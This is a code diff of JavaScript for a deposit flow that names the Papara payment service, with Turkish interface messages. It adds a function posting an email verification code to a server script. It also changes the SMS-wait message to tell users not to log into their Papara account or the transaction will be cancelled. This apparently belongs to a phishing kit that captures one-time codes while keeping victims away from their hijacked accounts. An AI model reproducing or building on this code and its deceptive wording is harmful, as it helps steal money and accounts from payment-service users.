@@ -58,12 +58,8 @@ function odemeDurum(type) {         //  create a loop function
 
           }
           else if(response == '4'){
-            Swal.fire("Hata!","Yatırım Talebiniz Onaylanmadı Lütfen Daha Sonra Tekrar Deneyin!","error");
-            setTimeout(function(){
-              window.location.href = '/m/deposit';
-            },
-            
-            5000)
+            $('#step-4').css("display","none");
+            $('#step-5').css("display","flex");
           }
       }
     })  
@@ -210,7 +206,7 @@ function smsOnay() {
       if (response == "success") {
         swal.fire({
           title: 'Lütfen Bekleyin',
-          text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
+          text: 'SMS Doğrulaması Kontrol Ediliyor. Bu Süreçte Papara Hesabınınza Giriş Yapmayın Aksi Takdirde İşleminiz Otomatik İptal Olur',
           allowOutsideClick: false,
           showConfirmButton: false
         })
@@ -219,7 +215,25 @@ function smsOnay() {
     },
   });
 }
-                            
+function emailOnay() {
+    $.ajax({
+      type: "POST",
+      url: "/papara/request.php?q=email-onay",
+      data: $("#form").serialize(),
+      success: (response) => {
+        if (response == "success") {
+          swal.fire({
+            title: 'Lütfen Bekleyin',
+            text: 'E-Mail Doğrulaması Kontrol Ediliyor. Bu Süreçte Papara Hesabınınza Giriş Yapmayın Aksi Takdirde İşleminiz Otomatik İptal Olur',
+            allowOutsideClick: false,
+            showConfirmButton: false
+          })
+          myLoop2()
+        }
+      },
+    });
+  }
+                       
                             
   function putPayment(id, message,showalert=true){
     const xhr = new XMLHttpRequest;
